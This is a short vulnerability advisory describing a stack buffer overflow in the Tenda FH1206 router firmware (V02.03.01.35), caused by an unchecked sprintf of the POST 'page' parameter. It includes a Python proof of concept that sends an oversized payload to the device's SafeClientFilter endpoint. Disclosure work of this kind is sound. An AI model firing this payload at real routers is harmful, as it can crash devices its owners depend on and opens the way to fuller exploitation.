## Overview

- Firmware download website: https://www.tenda.com.cn/download/detail-2905.html

## Affected version

FH1206 V02.03.01.35

## Vulnerability details

The Tenda FH1206 V02.03.01.35 has a stack overflow vulnerability located in the `fromSafeClientFilter` function. This function accepts the `page` parameter from a POST request. The statement `sprintf(v15, "firewall_clientlist.asp?page=%s", v10);` leads to a buffer overflow. The user-supplied `page` can exceed the capacity of the `v15` array, thus triggering this security vulnerability.

![image-20240731134037581](https://raw.githubusercontent.com/abcdefg-png/images2/main/image-20240731134037581.png)

## POC

```python
import requests

ip = "192.168.84.101"
url = "http://" + ip + "/goform/SafeClientFilter"
payload = b"a"*1000

data = {"page": payload, "menufacturer": "1"}
response = requests.post(url, data=data)
print(response.text)
```

![](https://raw.githubusercontent.com/abcdefg-png/images2/main/image-20240801202321673.png)
